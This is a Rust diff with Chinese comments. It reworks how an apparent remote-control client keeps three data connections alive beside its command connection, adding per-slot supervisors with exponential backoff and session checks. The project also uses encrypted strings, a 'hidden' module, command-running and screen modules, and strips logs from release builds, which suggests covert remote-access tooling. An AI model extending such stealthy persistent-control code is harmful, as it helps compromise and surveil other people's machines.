@@ -11,7 +11,7 @@ use common::generated::encrypted_strings::*;
 use common::hidden;
 use common::host::get_host;
 use std::path::Path;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 use tokio::fs::{File, OpenOptions};
 use tokio::task::JoinSet;
 use tokio::time;
@@ -27,7 +27,11 @@ macro_rules! dev_debug {
 
 #[cfg(not(all(debug_assertions, feature = "development-logging")))]
 macro_rules! dev_debug {
-    ($($arg:tt)*) => {};
+    // 返回显式的单元值，使宏既能作为普通语句，也能安全地放在 match 分支等表达式位置。
+    // 参数 token 不会进入展开结果，因此发布产物仍不会包含日志格式串。
+    ($($arg:tt)*) => {{
+        ()
+    }};
 }
 
 mod cmd_runner;
@@ -37,6 +41,11 @@ mod kik_conn;
 mod kik_data_conn;
 mod read_handle;
 mod screen;
+
+/// 每个主会话维持三条独立数据连接，既可并行发送分片，也允许单链路故障时继续工作。
+const DESIRED_DATA_CONNECTIONS: usize = 3;
+const DATA_RECONNECT_MAX_BACKOFF: Duration = Duration::from_secs(30);
+const DATA_CONNECTION_STABLE_AFTER: Duration = Duration::from_secs(30);
 
 #[tokio::test]
 async fn test() {
@@ -105,34 +114,28 @@ async fn run_client() -> anyhow::Result<()> {
         for _ in 0..3 {
             match kik_conn::kik_conn(context.clone(), &config).await {
                 Ok(h) => {
-                    // 主连接已经取得 Kik ID，此时三条数据连接才能安全绑定到本轮 Kik 会话。
-                    let (data_context, data_config) = (context.clone(), config.clone());
-                    let data_init_task = tokio::spawn(async move {
-                        let mut attempts = JoinSet::new();
-                        for _ in 0..3 {
-                            let (context, config) = (data_context.clone(), data_config.clone());
-                            attempts.spawn(async move {
-                                kik_data_conn::kik_data_conn(context, &config).await
-                            });
-                        }
-                        while let Some(result) = attempts.join_next().await {
-                            match result {
-                                Ok(Ok(_connection_task)) => {}
-                                Ok(Err(_error)) => {
-                                    dev_debug!("{}", _error);
-                                }
-                                Err(_error) => {
-                                    dev_debug!("{}", _error);
-                                }
-                            }
-                        }
-                    });
+                    // 主连接已经取得 Kik ID。每个监督槽位负责“一条连接的整个生命周期”：连接退出后
+                    // 原槽位会指数退避并补建，而不是像旧实现那样只在进程首次上线时尝试一次。
+                    let Some(expected_kik) = context.get_kik().await else {
+                        h.abort();
+                        continue;
+                    };
+                    let mut data_supervisors = JoinSet::new();
+                    for slot in 0..DESIRED_DATA_CONNECTIONS {
+                        data_supervisors.spawn(supervise_data_connection_slot(
+                            context.clone(),
+                            config.clone(),
+                            expected_kik.clone(),
+                            slot,
+                        ));
+                    }
                     let _ = h.await;
-                    // 命令连接已经失效时，不允许仍在握手的数据连接加入旧会话。
-                    data_init_task.abort();
-                    let _ = data_init_task.await;
+                    // 先关闭连接并撤销“当前会话”身份，再取消监督器。即使某个旧握手恰好完成，
+                    // `insert_data_conn_for` 的 Arc 身份校验也会拒绝它进入下一轮连接池。
                     context.clear().await;
                     context.set_kik(None).await;
+                    data_supervisors.abort_all();
+                    while data_supervisors.join_next().await.is_some() {}
                 }
                 Err(_error) => {
                     dev_debug!("命令连接失败: {}", _error);
@@ -142,6 +145,45 @@ async fn run_client() -> anyhow::Result<()> {
         }
 
         time::sleep(Duration::from_secs(20)).await;
+    }
+}
+
+/// 维护一个 KikData 连接槽位，直到所属主连接结束。
+///
+/// 三个槽位彼此独立，某条链路断开不会取消仍健康的链路。短连接连续失败时使用指数退避并按槽位
+/// 错开少量时间，避免服务端恢复瞬间三个连接同步形成重连尖峰；稳定运行 30 秒后重新从最短退避开始。
+async fn supervise_data_connection_slot(
+    context: Context,
+    config: Config,
+    expected_kik: context::Kik,
+    slot: usize,
+) {
+    let mut backoff = Duration::from_secs(1);
+    loop {
+        if !context.is_current_kik(&expected_kik).await {
+            return;
+        }
+
+        let connected_at = Instant::now();
+        match kik_data_conn::kik_data_conn(context.clone(), expected_kik.clone(), &config).await {
+            Ok(connection_task) => {
+                let _ = connection_task.await;
+                if connected_at.elapsed() >= DATA_CONNECTION_STABLE_AFTER {
+                    backoff = Duration::from_secs(1);
+                }
+            }
+            Err(_error) => dev_debug!("数据连接槽位 {} 建立失败: {}", slot, _error),
+        }
+
+        if !context.is_current_kik(&expected_kik).await {
+            return;
+        }
+        let stagger = Duration::from_millis((slot as u64) * 250);
+        time::sleep(backoff + stagger).await;
+        backoff = backoff
+            .checked_mul(2)
+            .unwrap_or(DATA_RECONNECT_MAX_BACKOFF)
+            .min(DATA_RECONNECT_MAX_BACKOFF);
     }
 }
 
